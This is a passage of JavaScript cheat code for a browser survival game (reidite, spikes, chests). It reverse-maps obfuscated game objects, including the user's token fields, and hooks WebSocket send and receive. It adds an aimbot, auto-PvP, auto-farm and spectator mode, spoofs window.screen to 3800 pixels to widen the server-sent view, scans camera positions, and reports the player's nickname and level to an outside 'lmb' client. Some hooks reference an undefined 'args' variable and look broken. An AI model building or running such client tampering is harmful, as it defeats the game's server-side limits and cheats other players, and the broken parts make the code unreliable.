        sprite[10010] = [ReiditeSpikeAlly, ReiditeSpikeAlly];
        sprite[10011] = [ReiditeSpikeEnemy, ReiditeSpikeEnemy];
        sprite[10012] = [ReiditeDoorSpikeAlly, ReiditeDoorSpikeAlly];
        sprite[10013] = [ReiditeDoorSpikeEnemy, ReiditeDoorSpikeEnemy];
        sprite[10014] = [AmethystDoorSpikeAlly, AmethystDoorSpikeAlly];
        sprite[10015] = [AmethystDoorSpikeEnemy, AmethystDoorSpikeEnemy];
        sprite[10016] = [DiamondDoorSpikeAlly, DiamondDoorSpikeAlly];
        sprite[10017] = [DiamondDoorSpikeEnemy, DiamondDoorSpikeEnemy];
        sprite[10018] = [GoldDoorSpikeAlly, GoldDoorSpikeAlly];
        sprite[10019] = [GoldDoorSpikeEnemy, GoldDoorSpikeEnemy];
        sprite[10020] = [StoneDoorSpikeAlly, StoneDoorSpikeAlly];
        sprite[10021] = [StoneDoorSpikeEnemy, StoneDoorSpikeEnemy];
        sprite[10022] = [WoodDoorSpikeAlly, WoodDoorSpikeAlly];
        sprite[10023] = [WoodDoorSpikeEnemy, WoodDoorSpikeEnemy];
        sprite[10024] = [ReiditeDoorAlly, ReiditeDoorAlly];
        sprite[10025] = [ReiditeDoorEnemy, ReiditeDoorEnemy];
        sprite[10026] = [AmethystDoorAlly, AmethystDoorAlly];
        sprite[10027] = [AmethystDoorEnemy, AmethystDoorEnemy];
        sprite[10028] = [DiamondDoorAlly, DiamondDoorAlly];
        sprite[10029] = [DiamondDoorEnemy, DiamondDoorEnemy];
        sprite[10030] = [GoldDoorAlly, GoldDoorAlly];
        sprite[10031] = [GoldDoorEnemy, GoldDoorEnemy];
        sprite[10032] = [StoneDoorAlly, StoneDoorAlly];
        sprite[10033] = [StoneDoorEnemy, StoneDoorEnemy];
        sprite[10034] = [WoodDoorAlly, WoodDoorAlly];
        sprite[10035] = [WoodDoorEnemy, WoodDoorEnemy];
        sprite[10100] = [];
        sprite[10100][0] = CTI(create_chest(0.5, true, ["#133a2b", "#9e8838", "#c4a23a", "#4c3b19", "#614627", "#614627", "#614627", "#c4a23a", "#c4a23a", "#c4a23a"]));
        sprite[10100][1] = CTI(create_chest(0.5, true, ["#032428", "#266161", "#2b6664", "#123335", "#1f5453", "#1f5453", "#1f5453", "#2b6664", "#2b6664", "#2b6664"]));
        sprite[10101] = [];
        sprite[10101][0] = CTI(create_chest(0.5, 1, "#133a2b #9e8838 #0D9900 #4c3b19 #614627 #614627 #614627 #0D9900 #0D9900 #0D9900".split(" ")));
        sprite[10101][1] = CTI(create_chest(0.5, 1, "#032428 #266161 #0D9900 #123335 #1f5453 #1f5453 #1f5453 #0D9900 #0D9900 #0D9900".split(" ")));
        sprite[10102] = [];
        sprite[10102][0] = CTI(create_chest(0.5, 1, "#133a2b #9e8838 #940000 #4c3b19 #614627 #614627 #614627 #940000 #940000 #940000".split(" ")));
        sprite[10102][1] = CTI(create_chest(0.5, 1, "#032428 #266161 #940000 #123335 #1f5453 #1f5453 #1f5453 #940000 #940000 #940000".split(" ")));
      } else {
        console.log("Failed to extract SPRITE");
      }
    }
    {
      IMAGES = Object.values(window).find(_param_724 => {
        return typeof _param_724 === "object" && !Array.isArray(_param_724) && _param_724 !== null && Object.keys(_param_724).length !== 0 && Object.values(_param_724).every(_param_725 => {
          return typeof _param_725 === "string";
        }) && _param_724.constructor.name !== "Storage";
      });
    }
    if (game.chest_buttons && game.chest_buttons[0] && game.chest_buttons[0].info && !("img" in game.chest_buttons[0].info)) {
      let imgKey;
      const target = game.chest_buttons[0].info;
      const keys = Object.keys(target);
      for (const key of keys) {
        const value = target[key];
        if (Array.isArray(value)) {
          imgKey = key;
          break;
        }
      }
      if (imgKey) {
        game.chest_buttons.forEach(_param_726 => {
          Object.defineProperty(_param_726.info, "img", {
            get() {
              return this[imgKey];
            }
          });
        });
        {
          let _srcKey;
          const target = game.chest_buttons[100].info.img[0];
          const keys = Object.keys(target);
          for (const key of keys) {
            const value = target[key];
            if (typeof value === "string") {
              _srcKey = key;
              break;
            }
          }
          if (_srcKey) {
            game.chest_buttons.forEach(_param_727 => {
              if (_param_727 && _param_727.info && _param_727.info.img && _param_727.info.img[0]) {
                Object.defineProperty(_param_727.info.img[0], "_src", {
                  get() {
                    return this[_srcKey];
                  }
                });
              }
            });
          }
        }
      } else {
        console.log("Failed to extract img from game.chest_buttons[0].info");
      }
    }
    {
      const keys = Object.keys(world);
      let indexOfWorldMaxDist;
      for (let i = 0; i < keys.length; i++) {
        const key = keys[i];
        if (typeof world[key] === "number" && world[key] && world[key] === -1000000) {
          indexOfWorldMaxDist = i;
          break;
        }
      }
      const distWinterKey = keys[indexOfWorldMaxDist + 1];
      const distDesertKey = keys[indexOfWorldMaxDist + 2];
      const distLavaKey = keys[indexOfWorldMaxDist + 3];
      const distForestKey = keys[indexOfWorldMaxDist + 4];
      const distWaterKey = keys[indexOfWorldMaxDist + 5];
      const distDragonKey = keys[indexOfWorldMaxDist + 6];
      dist_desertKey = distDesertKey;
      Object.defineProperties(world, {
        dist_winter: {
          get() {
            return this[distWinterKey];
          }
        },
        dist_desert: {
          get() {
            return this[distDesertKey];
          }
        },
        dist_lava: {
          get() {
            return this[distLavaKey];
          }
        },
        dist_forest: {
          get() {
            return this[distForestKey];
          }
        },
        dist_water: {
          get() {
            return this[distWaterKey];
          }
        },
        dist_dragon: {
          get() {
            return this[distDragonKey];
          }
        }
      });
    }
    {
      const keys = Object.keys(user);
      const findedRes = keys.filter(_param_728 => {
        return typeof user[_param_728] === "string";
      });
      const tokenKey = findedRes[0];
      const tokenIdKey = findedRes[1];
      Object.defineProperties(user, {
        token: {
          get() {
            return this[tokenKey];
          },
          set(value) {
            this[tokenKey] = value;
          }
        },
        token_id: {
          get() {
            return this[tokenIdKey];
          },
          set(value) {
            this[tokenIdKey] = value;
          }
        }
      });
    }
    {
      {
        const obj = Object.values(user).filter(_param_729 => {
          return typeof _param_729 === "object" && !Array.isArray(_param_729) && _param_729 && "enabled" in _param_729;
        })[0];
        let findedKey;
        for (const key in obj) {
          const value = obj[key];
          if (typeof value === "function") {
            findedKey = key;
            break;
          }
        }
        if (findedKey) {
          EncodeDict.draw = findedKey;
        } else {
          console.log("cannot extract draw key");
        }
      }
      {
        let findedKey = Object.keys(world).filter(_param_730 => {
          return typeof world[_param_730] === "function" && world[_param_730].length === 0;
        })[1];
        if (findedKey) {
          EncodeDict.update = findedKey;
        } else {
          console.log("cannot extract update key");
        }
      }
      {
        let findedKey = Object.keys(user).filter(key => {
          return typeof user[key] === "object" && user[key] && "enabled" in user[key] && "label" in user[key] && "now" in user[key];
        });
        if (findedKey) {
          EncodeDict.ghost = findedKey;
        } else {
          console.log("Cannot extract ghost key");
        }
      }
    }
    {
      const target = user.cam;
      const key = Object.keys(target).find(_param_731 => {
        return typeof target[_param_731] === "function" && target[_param_731].length === 0;
      });
      const orignial_function = target[key];
      target[key] = function (...args) {
        if (!Settings.Spectator.e) {
          orignial_function.apply(this, args);
        }
      };
    }
    {
      const keys = Object.keys(client);
      const timeout_serverKey = keys[keys.indexOf("timeout") - 3];
      Object.defineProperty(client, "timeout_server", {
        get() {
          return this[timeout_serverKey];
        },
        set(value) {
          this[timeout_serverKey] = value;
        }
      });
    }
    if (user.desert) {
      const keys = Object.keys(user.desert).filter(_param_732 => {
        return typeof user.desert[_param_732] === "number" && user.desert[_param_732] === 0;
      });
      const tempestKey = keys[0];
      Object.defineProperty(user.desert, "tempest", {
        get() {
          return this[tempestKey];
        },
        set(value) {
          this[tempestKey] = value;
        }
      });
    }
    if (user.winter) {
      const keys = Object.keys(user.winter).filter(key => {
        return typeof user.winter[key] === "number" && user.winter[key] === 0;
      });
      const tempestKey = keys[0];
      Object.defineProperty(user.winter, "tempest", {
        get() {
          return this[tempestKey];
        },
        set(value) {
          this[tempestKey] = value;
        }
      });
    }
    if (client.initWebSocketConnection) {
      const input = client.initWebSocketConnection.toString();
      const regex = /var\s+([\p{L}\p{N}_\p{Cf}$]+)\s*=\s*([\p{L}\p{N}_\p{Cf}$]+)\s*\(\s*([\p{L}\p{N}_\p{Cf}$]+)\s*\.?\s*data\s*,\s*([\p{L}\p{N}_\p{Cf}$]+)\s*\.\s*([\p{L}\p{N}_\p{Cf}$]+)\s*,\s*([\p{L}\p{N}_\p{Cf}$]+)\s*\.\s*([\p{L}\p{N}_\p{Cf}$]+)\s*\)\s*?/gu;
      const matches = [...input.matchAll(regex)];
      let match = matches[0];
      let decodeFunctionKey = match[2];
      userDecodeToken1Key = match[5];
      userDecodeToken2Key = match[7];
      decodeFunction = window[decodeFunctionKey];
    }
  }
  function hooks() {
    function hook_draw_gauges() {
      const draw_gauges_name = Object.keys(game.gauges)[2];
      if (draw_gauges_name && game.gauges[draw_gauges_name] && typeof game.gauges[draw_gauges_name] === "function") {
        let origin_draw_gauges = game.gauges[draw_gauges_name];
        game.gauges[draw_gauges_name] = function () {
          if (Settings.GaugesUI === "new" && !Settings.HideScript.e) {
            draw_gauges1.apply(this, arguments);
          } else {
            origin_draw_gauges.apply(this, arguments);
          }
          if (Settings.ShowGauges.e && !Settings.HideScript.e) {
            if (Settings.GaugesUI === "new") {
              ctx.save();
              let t = user.inv.can_select.length > 0 ? -70 : 0;
              if (user.chest.open || user.furnace.open && user.inv.n[INV.WOOD] || user.windmill.open && user.inv.n[INV.WHEAT] || user.extractor.open && user.inv.n[INV.WOOD] || user.well.open && user.inv.n[INV.BUCKET_FULL] || user.bread_oven.open && (user.inv.n[INV.WOOD] || user.inv.n[INV.FLOUR])) {
                t -= scale * 50;
              }
              ctx.translate(innerWidth / 2, t);
              ctx.font = "48px Baloo Paaji";
              ctx.lineWidth = 7;
              ctx.fillStyle = "#fff";
              {
                ctx.textAlign = "center";
                if (Math.floor(11 - (Date.now() - __p_ePLv_TimerTools_HPTimer) / 1000) > 5) {
                  ctx.strokeStyle = "#aa362d";
                } else {
                  ctx.strokeStyle = "#6da151";
                }
                let timerText = Math.floor(11 - (Date.now() - __p_ePLv_TimerTools_HPTimer) / 1000) > 5 ? Math.floor(11 - (Date.now() - __p_ePLv_TimerTools_HPTimer) / 1000 - 5) : Math.floor(11 - (Date.now() - __p_ePLv_TimerTools_HPTimer) / 1000);
                ctx.strokeText(timerText, 0, this.translate.y + scale * 34);
                ctx.fillText(timerText, 0, this.translate.y + scale * 34);
              }
              {
                if (user.gauges.oxygen.x < 1) {
                  ctx.font = "28px Baloo Paaji";
                  ctx.strokeStyle = "#9cb9c4";
                  ctx.strokeText(Math.floor(user.gauges.oxygen.x * 100), 0, this.translate.y - scale * 30);
                  ctx.fillText(Math.floor(user.gauges.oxygen.x * 100), 0, this.translate.y - scale * 30);
                }
              }
              ctx.font = "34px Baloo Paaji";
              ctx.strokeStyle = "#6da151";
              ctx.textAlign = "left";
              ctx.strokeText(Math.floor(user.gauges.life.x * 200), scale * -435, this.translate.y + scale * 8);
              ctx.fillText(Math.floor(user.gauges.life.x * 200), scale * -435, this.translate.y + scale * 8);
              ctx.strokeStyle = "#aa362d";
              ctx.strokeText(Math.floor(user.gauges.hunger.x * 100), scale * -195, this.translate.y + scale * 8);
              ctx.fillText(Math.floor(user.gauges.hunger.x * 100), scale * -195, this.translate.y + scale * 8);
              ctx.textAlign = "right";
              ctx.fillStyle = "#fff";
              ctx.strokeStyle = "#174984";
              ctx.strokeText(Math.floor(user.gauges.thirst.x * 100), scale * 435, this.translate.y + scale * 8);
              ctx.fillText(Math.floor(user.gauges.thirst.x * 100), scale * 435, this.translate.y + scale * 8);
              ctx.strokeStyle = "#6b9baf";
              ctx.strokeText(user.gauges.cold.x === 1 ? 200 - Math.floor(user.gauges.warm.x * 100) : Math.floor(user.gauges.cold.x * 100), scale * 195, this.translate.y + scale * 8);
              ctx.fillText(user.gauges.cold.x === 1 ? 200 - Math.floor(user.gauges.warm.x * 100) : Math.floor(user.gauges.cold.x * 100), scale * 195, this.translate.y + scale * 8);
              ctx.restore();
            } else {
              ctx.save();
              let t = user.inv.can_select.length > 0 ? -70 : 0;
              if (user.chest.open || user.furnace.open && user.inv.n[INV.WOOD] || user.windmill.open && user.inv.n[INV.WHEAT] || user.extractor.open && user.inv.n[INV.WOOD] || user.well.open && user.inv.n[INV.BUCKET_FULL] || user.bread_oven.open && (user.inv.n[INV.WOOD] || user.inv.n[INV.FLOUR])) {
                t -= scale * 50;
              }
              ctx.translate((innerWidth - scale * 950) / 2, t);
              ctx.font = "34px Baloo Paaji";
              ctx.strokeStyle = "#6da151";
              ctx.fillStyle = "#fff";
              ctx.lineWidth = 7;
              ctx.strokeText(Math.floor(user.gauges.life.x * 200), this.translate.x + scale * 50, this.translate.y + scale * 8);
              ctx.fillText(Math.floor(user.gauges.life.x * 200), this.translate.x + scale * 50, this.translate.y + scale * 8);
              if (Math.floor(11 - (Date.now() - __p_ePLv_TimerTools_HPTimer) / 1000) > 5) {
                ctx.strokeStyle = "#aa362d";
              } else {
                ctx.strokeStyle = "#6da151";
              }
              let timerText = Math.floor(11 - (Date.now() - __p_ePLv_TimerTools_HPTimer) / 1000) > 5 ? Math.floor(11 - (Date.now() - __p_ePLv_TimerTools_HPTimer) / 1000 - 5) : Math.floor(11 - (Date.now() - __p_ePLv_TimerTools_HPTimer) / 1000);
              ctx.strokeText(timerText, this.translate.x + scale * 469, this.translate.y + scale * 36);
              ctx.fillText(timerText, this.translate.x + scale * 469, this.translate.y + scale * 36);
              ctx.strokeStyle = "#aa362d";
              ctx.strokeText(Math.floor(user.gauges.hunger.x * 100) + "%", this.translate.x + scale * 290, this.translate.y + scale * 8);
              ctx.fillText(Math.floor(user.gauges.hunger.x * 100) + "%", this.translate.x + scale * 290, this.translate.y + scale * 8);
              ctx.fillStyle = "#fff";
              ctx.strokeStyle = "#174984";
              ctx.strokeText(Math.floor(user.gauges.thirst.x * 100) + "%", this.translate.x + scale * 770, this.translate.y + scale * 8);
              ctx.fillText(Math.floor(user.gauges.thirst.x * 100) + "%", this.translate.x + scale * 770, this.translate.y + scale * 8);
              ctx.strokeStyle = "#6b9baf";
              ctx.strokeText((user.gauges.cold.x === 1 ? 200 - Math.floor(user.gauges.warm.x * 100) : Math.floor(user.gauges.cold.x * 100)) + "%", this.translate.x + scale * 530, this.translate.y + scale * 8);
              ctx.fillText((user.gauges.cold.x === 1 ? 200 - Math.floor(user.gauges.warm.x * 100) : Math.floor(user.gauges.cold.x * 100)) + "%", this.translate.x + scale * 530, this.translate.y + scale * 8);
              ctx.restore();
            }
          }
        };
      } else {
        console.log("Failed to hook draw_gauges");
      }
    }
    function hook_onerror(...__p_Tz0l_varMask) {
      const original_oneror = client.socket.onerror;
      client.socket.onerror = function () {
        for (const key in user) {
          const val = user[key];
          if (typeof val === "string" && val.includes("_") && !val.startsWith("_") && !val.endsWith("_")) {
            val[key] = undefined;
            break;
          }
        }
        original_oneror.apply(this, arguments);
      };
    }
    function hook_onopen(...__p_n6SE_varMask) {
      const original_onopen = client.socket.onopen;
      client.socket.onopen = function () {
        const originalScreen = window.screen;
        const fakeScreen = new Proxy(originalScreen, {
          get(target, prop) {
            if (prop === "width" || prop === "height") {
              return 3800;
            }
            return Reflect.get(target, prop);
          }
        });
        try {
          Object.defineProperty(window, "screen", {
            get() {
              return fakeScreen;
            },
            configurable: true
          });
        } catch (e) {
          console.warn("Không thể ghi đè window.screen:", e);
        }
        original_onopen.apply(this, arguments);
        workerTimers.setTimeout(() => {
          try {
            Object.defineProperty(window, "screen", {
              value: originalScreen,
              writable: false,
              configurable: true,
              enumerable: true
            });
          } catch (e) {
            console.warn("Không thể khôi phục screen gốc:", e);
          }
        }, 1000);
      };
    }
    function hook_send() {
      const original_send = client.socket.send;
      client.socket.send = function (_param_733) {
        let data = _param_733;
        if (typeof data == "string") {
          let a = JSON.parse(data);
          switch (a[0]) {}
        } else {
          let a = new Uint8Array(data);
          switch (a[0]) {}
        }
        if (client.socket.readyState === 1) {
          original_send.apply(this, args);
        }
      };
    }
    function hook_onmessage() {
      let _var_807 = undefined;
      const original_onmessage = client.socket.onmessage;
      client.socket.onmessage = function (_param_734) {
        let e1 = {
          ..._param_734,
          data: _param_734.data.slice(0)
        };
        if (typeof e1.data === "string") {} else {
          let a = decodeFunction(e1.data, user[userDecodeToken1Key], user[userDecodeToken2Key]);
          switch (a[0]) {
            case 21:
              client.leaderboard(e1.data);
              return;
              break;
            case 16:
              user.bandage = a[7];
              break;
            case 37:
              user.bandage = a[2];
              break;
            case 71:
              user.bandage = a[1];
              break;
          }
        }
        original_onmessage.apply(this, args);
        let e = _param_734;
        if (typeof e.data == "string") {
          let a = JSON.parse(e.data);
          switch (a[0]) {
            case 0:
              if (Settings.AutoFarm.e && Settings.AutoFarm.dropBeri && a[2] === Settings.AutoFarm.cmd) {
                let myPlayer = world.fast_units[user.uid];
                let sendedPlayer = world.fast_units[a[1] * world.max_units];
                if (myPlayer.pid !== sendedPlayer.pid) {
                  if (Utils.dist(myPlayer, sendedPlayer) <= Settings.AutoFarm.distance) {
                    let t = 0;
                    if (user.inv.n[INV.BERRY]) {
                      send_drop_all(INV.BERRY);
                      send_chat("Berries: " + user.inv.n[INV.BERRY]);
                      t += 1100;
                    }
                    if (user.inv.n[INV.PUMPKIN]) {
                      workerTimers.setTimeout(() => {
                        send_drop_all(INV.PUMPKIN);
                        send_chat("Pumpkins: " + user.inv.n[INV.PUMPKIN]);
                      }, t);
                      t += 1100;
                    }
                    if (user.inv.n[INV.WHEAT]) {
                      workerTimers.setTimeout(() => {
                        send_drop_all(INV.WHEAT);
                        send_chat("Wheats: " + user.inv.n[INV.WHEAT]);
                      }, t);
                      t += 1100;
                    }
                    if (user.inv.n[INV.CARROT]) {
                      workerTimers.setTimeout(() => {
                        send_drop_all(INV.CARROT);
                        send_chat("Carrots: " + user.inv.n[INV.CARROT]);
                      }, t);
                      t += 1100;
                    }
                    if (user.inv.n[INV.TOMATO]) {
                      workerTimers.setTimeout(() => {
                        send_drop_all(INV.TOMATO);
                        send_chat("Tomatoes: " + user.inv.n[INV.TOMATO]);
                      }, t);
                      t += 1100;
                    }
                    if (user.inv.n[INV.THORNBUSH]) {
                      workerTimers.setTimeout(() => {
                        send_drop_all(INV.THORNBUSH);
                        send_chat("Thorns: " + user.inv.n[INV.THORNBUSH]);
                      }, t);
                      t += 1100;
                    }
                    if (user.inv.n[INV.GARLIC]) {
                      workerTimers.setTimeout(() => {
                        send_drop_all(INV.GARLIC);
                        send_chat("Garlic: " + user.inv.n[INV.GARLIC]);
                      }, t);
                      t += 1100;
                    }
                    if (user.inv.n[INV.ALOE_VERA]) {
                      workerTimers.setTimeout(() => {
                        send_drop_all(INV.ALOE_VERA);
                        send_chat("Aloe Vera: " + user.inv.n[INV.ALOE_VERA]);
                      }, t);
                    }
                  }
                }
              }
              if (Settings.AutoSpike.isSpikeInWater && user.in_team(a[1]) && user.inv.n[INV.BRIDGE]) {
                const ji = extractJI(a[2]);
                if (ji) {
                  build_bridge(ji.j, ji.i);
                }
              }
              break;
            case 2:
              {
                const id = a[1];
                world.players[id].nickname = a[2];
                thisPlayer = world.players[id];
                thisPlayer.alive = true;
                thisPlayer.joinTime = performance.now();
                workerTimers.setTimeout(() => {
                  __p_d8ju_JoinLeave_Join.unshift(id);
                  if (__p_d8ju_JoinLeave_Join.length > 5) {
                    __p_d8ju_JoinLeave_Join.pop();
                  }
                }, 750);
                __p_d8ju_JoinLeave_toggle11 = true;
                workerTimers.clearTimeout(__p_d8ju_JoinLeave_toggle1);
                __p_d8ju_JoinLeave_toggle1 = workerTimers.setTimeout(() => {
                  __p_d8ju_JoinLeave_toggle11 = false;
                }, 10000);
              }
              break;
            case 3:
              world.max_units = a[7];
              if (user.uid !== world.max_units * user.id) {
                user.uid = world.max_units * user.id;
                console.log("Wrong hook user.uid");
              }
              __p_ePLv_TimerTools_HPTimer = Date.now();
              __p_ePLv_TimerTools_GaugeTimer = Date.now();
              const players = a[4];
              for (var i = 0, len = players.length; i < len; i++) {
                const id = players[i].i;
                world.players[id].alive = true;
              }
              world.players.forEach(player => {
                if (!EncodeDict.nickname) {
                  const keys = Object.keys(player);
                  EncodeDict.nickname = keys[0];
                }
                player.nickname = player[EncodeDict.nickname];
                if (!_var_807) {
                  _var_807 = Object.keys(player).find(key => {
                    return typeof player[key] === "object" && player[key] === null && key !== "label";
                  });
                }
                Object.defineProperty(player, "label_winter", {
                  get() {
                    return this[_var_807];
                  },
                  set(value) {
                    this[_var_807] = value;
                  }
                });
              });
              workerTimers.setTimeout(() => {
                let _var_808 = world.players[user.id];
                send_my_info_to_lmb(_var_808.nickname, _var_808.level);
              }, 2000);
              lmbClient.connect();
              user.blizzard = false;
              world.nw = a[20];
              world.nh = a[21];
              if (Settings.ShowLastDead.Pos) {
                if (Date.now() - Settings.ShowLastDead.time > 360000) {
                  Settings.ShowLastDead.Pos = null;
                  __p_JN2z_UtilsUI_saveSettings();
                }
              }
              healTimestamps = {};
              buildLimit = 0;
              let serverName = document.querySelector("button.ng-binding").innerText.split(" [")[0];
              damageCalculator = new DamageCalculator(world.mode, serverName);
              break;
          }
        } else {
          let a = new Uint8Array(e.data);
          switch (a[0]) {
            case 15:
              IsSomeOneDied = true;
              workerTimers.setTimeout(() => {
                IsSomeOneDied = false;
              }, 200);
              let playerId = a[1];
              if (playerId === temp.autopvpLockId) {
                temp.autopvpLockId = 0;
                gui?.refresh();
              }
              world.players[playerId].alive = false;
              __p_d8ju_JoinLeave_Leave.unshift(world.players[playerId].nickname + " | " + world.players[playerId].level);
              if (__p_d8ju_JoinLeave_Leave.length > 5) {
                __p_d8ju_JoinLeave_Leave.pop();
              }
              __p_d8ju_JoinLeave_toggle22 = true;
              workerTimers.clearTimeout(__p_d8ju_JoinLeave_toggle2);
              __p_d8ju_JoinLeave_toggle2 = workerTimers.setTimeout(() => {
                __p_d8ju_JoinLeave_toggle22 = false;
              }, 10000);
              healTimestamps[playerId] = null;
              break;
            case 18:
              if (AutoEme_isFarming) {
                AutoEme_currentIndex = (AutoEme_currentIndex + 1) % AutoEme_farmLocations.length;
                AutoEme_isFarming = false;
              }
              break;
            case 25:
              let myPlayer = world.fast_units[user.uid];
              if (myPlayer) {
                Settings.ShowLastDead.Pos = {
                  x: myPlayer.x,
                  y: myPlayer.y
                };
                Settings.ShowLastDead.time = Date.now();
                __p_JN2z_UtilsUI_saveSettings();
              }
              break;
            case 28:
              for (let i = 0, len = weapons.length; i < len; i++) {
                user.inv.n[weapons[i]] = 0;
              }
              break;
            case 29:
              if (Settings.AutoCrown.e && user.inv.n[INV.CROWN_OF_THE_ANGEL] && Settings.AutoCrown.health_to_activate === 200) {
                client.select_inv(INV.CROWN_OF_THE_ANGEL);
              }
              break;
            case 31:
            case 32:
            case 33:
            case 34:
              if (a[0] === 34 || a[0] === 32 && a[1] === user.id) {
                TotemCoor = null;
              } else if (a[0] === 31) {
                const totem = world.units[ITEMS.TOTEM].find(item => {
                  return user.in_team(item.pid);
                });
                if (totem) {
                  TotemCoor = {
                    x: totem.x,
                    y: totem.y
                  };
                }
              }
              updateAllys();
              if (lmbClient && lmbClient.socket && lmbClient.socket.readyState === 1) {
                lmbClient.send_update_team(user.team);
              }
              break;
            case 70:
              const isCantHealInBlizzard = a[1];
              user.blizzard = isCantHealInBlizzard;
              if (isCantHealInBlizzard) {
                isCantHealInBlizzardStartTime = performance.now();
              }
          }
        }
      };
    }
    if (client.initWebSocketConnection) {
      let original_function = client.initWebSocketConnection;
      client.initWebSocketConnection = function () {
        original_function.apply(this, arguments);
        hook_onmessage();
        hook_onopen();
        hook_onerror();
      };
    }
    hook_draw_gauges();
    {
      const keys = Object.keys(client);
      let index;
      for (let i = 0; i < keys.length; i++) {
        const value = client[keys[i]];
        if (typeof value === "function" && value.toString().includes(".length") && value.toString().includes(".loaded") && value.toString().includes(".angle")) {
          index = i - 1;
          break;
        }
      }
      if (index) {
        const original_function = client[keys[index]];
        client[keys[index]] = function (...args) {
          if (Settings.ShowPing.e && (world.fast_units[user.uid] || Settings.Spectator.e)) {
            PingCounter = Date.now() - start_ping_time;
          } else {
            original_function.apply(this, args);
          }
        };
      } else {
        console.log("Failed to hook client.recover_focus");
      }
    }
    {
      const keys = Object.keys(user.control);
      const function_name = keys.find(_param_735 => {
        return typeof user.control[_param_735] === "function";
      });
      if (function_name) {
        let orignial_function = user.control[function_name];
        user.control[function_name] = function () {
          let myPlayer = world.fast_units[user.uid];
          let e;
          if (myPlayer) {
            e = {
              x: user.cam.x + myPlayer.x,
              y: user.cam.y + myPlayer.y
            };
          } else {
            e = canm;
          }
          let a;
          if ((Settings.Aimbot.e || Settings.AutoPvP.e || Settings.SyncToPlayer.e) && Settings.Aimbot.angle !== null) {
            a = Settings.Aimbot.angle;
            if (myPlayer) {
              if (Settings.Aimbot.isSmooth) {
                myPlayer.nangle = Settings.Aimbot.angle;
              } else {
                myPlayer.nangle = Settings.Aimbot.angle;
                myPlayer.angle = Settings.Aimbot.angle;
              }
            }
          } else if (Settings.AutoKsDeadBox.e && Settings.AutoKsDeadBox.angle !== null) {
            a = Settings.AutoKsDeadBox.angle;
            myPlayer.nangle = a;
          } else if (Settings.AutoFarm.e && Settings.AutoFarm.angle !== null) {
            a = Settings.AutoFarm.angle;
            if (myPlayer) {
              myPlayer.nangle = Settings.AutoFarm.angle;
            }
          } else if (Settings.AutoHamCmty.e && Settings.AutoHamCmty.angle !== null) {
            a = Settings.AutoHamCmty.angle;
            if (myPlayer) {
              myPlayer.nangle = Settings.AutoHamCmty.angle;
            }
          } else if (Settings.AntiHood.e && Settings.AntiHood.angle) {
            a = Settings.AntiHood.angle;
            if (myPlayer) {
              myPlayer.nangle = a;
            }
          } else if (Settings.AutoTame.e && Settings.AutoTame.angle) {
            a = Settings.AutoTame.angle;
            if (myPlayer) {
              myPlayer.nangle = a;
            }
          } else if (Settings.LockAngle.e) {
            a = toRadian(Settings.LockAngle.angle);
            if (myPlayer) {
              myPlayer.nangle = a;
            }
          } else if (Settings.AutoEme.e && AutoEme_angle !== null) {
            a = AutoEme_angle;
            if (myPlayer) {
              myPlayer.nangle = a;
            }
          } else if (myPlayer) {
            a = calcAngle(mouse.pos, e, false) + Math.PI;
            myPlayer.angle = a;
            myPlayer.nangle = a;
          }
          let i = false;
          this.mouse += delta;
          if (!mouse.state && myPlayer && !(myPlayer.action & __p_ODkn_STATE_ATTACK) && this.mouse >= 0.1) {
            this.attack = 1;
            i = true;
            this.mouse = 0;
            send_angle(a);
            send_attack(a);
          }
          if (!i) {
            this.timeout += delta;
            if (this.timeout > __p_O0mQ_CLIENT_ROTATE) {
              this.timeout = 0;
              if (Math.abs(this.angle - a) > 0.005) {
                send_angle(a);
                if (Settings.Aimbot.angle === null) {
                  this.angle = a;
                }
              }
            }
          }
          if (user.chat.open) {
            return;
          }
          if (user.terminal.open) {
            return;
          }
          let dir = 0;
          if (keyboard.is_left()) {
            dir |= 1;
          }
          if (keyboard.is_right()) {
            dir |= 2;
          }
          if (keyboard.is_bottom()) {
            dir |= 4;
          }
          if (keyboard.is_top()) {
            dir |= 8;
          }
          if (oldUserDir != dir && !Settings.Spectator.e) {
            send_move(dir);
          }
          oldUserDir = dir;
        };
      } else {
        console.log("Failed to hook user.control.update");
      }
    }
    if (client.update_cam) {
      client.update_cam = function (isSendAnyway) {
        if (old_timestamp - this.cam_delay > __p_O0mQ_CLIENT_CAM_DELAY || ThisTabMiniMized && performance.now() - MinimizedTimer > __p_O0mQ_CLIENT_CAM_DELAY) {
          MinimizedTimer = performance.now();
          this.cam_delay = old_timestamp;
          let userCam = user.cam;
          let x100 = Math.floor(userCam.x / 100);
          let y100 = Math.floor(userCam.y / 100);
          if (autoCameraControlActive) {
            switch (cameraUpdateStep) {
              case 0:
                cameraUpdateStep++;
                client.socket.send(JSON.stringify([0, Math.floor(-userCam.x), Math.floor(-userCam.y)]));
                break;
              case 1:
                cameraUpdateStep++;
                if (world.fast_units[user.uid]) {
                  client.socket.send(JSON.stringify([0, Math.floor(world.fast_units[user.uid].x), Math.floor(world.fast_units[user.uid].y)]));
                }
                break;
              case 2:
                cameraUpdateStep++;
                if (world.fast_units[user.uid]) {
                  client.socket.send(JSON.stringify([0, Math.floor(world.fast_units[user.uid].x), Math.floor(world.fast_units[user.uid].y - 1400)]));
                }
                break;
              case 3:
                cameraUpdateStep++;
                if (world.fast_units[user.uid]) {
                  client.socket.send(JSON.stringify([0, Math.floor(world.fast_units[user.uid].x - 1700), Math.floor(world.fast_units[user.uid].y - 1400)]));
                }
                break;
              case 4:
                cameraUpdateStep = 1;
                if (world.fast_units[user.uid]) {
                  client.socket.send(JSON.stringify([0, Math.floor(world.fast_units[user.uid].x - 1700), Math.floor(world.fast_units[user.uid].y)]));
                }
                break;
            }
          } else if (this.last_cam.i != x100 || this.last_cam.j != y100 || isSendAnyway) {
            client.socket.send(JSON.stringify([0, Math.floor(-userCam.x) + 275 + Settings.OffsetCam.x, Math.floor(-userCam.y) + 160 + Settings.OffsetCam.y]));
            this.last_cam.i = x100;
            this.last_cam.j = y100;
          }
        }
      };
    }
    {
      let original_function = client.select_craft;
      client.select_craft = function (id) {
        let myPlayer = world.fast_units[user.uid];
        if (Settings.AutoBook.e && user.inv.n[INV.BOOK] && !user.weapon.wait) {
          if (incomingRight !== null) {
            if (incomingRight !== INV.BOOK) {
              oldRight = incomingRight;
              send_select_inv(INV.BOOK);
              incomingRight = INV.BOOK;
            }
          } else if (myPlayer && myPlayer.right !== INV.BOOK) {
            oldRight = myPlayer.right === -1 ? INV.HAND : myPlayer.right;
            send_select_inv(INV.BOOK);
            incomingRight = INV.BOOK;
          }
        }
        if (original_function.call(this, id)) {
          LastCrafted = id;
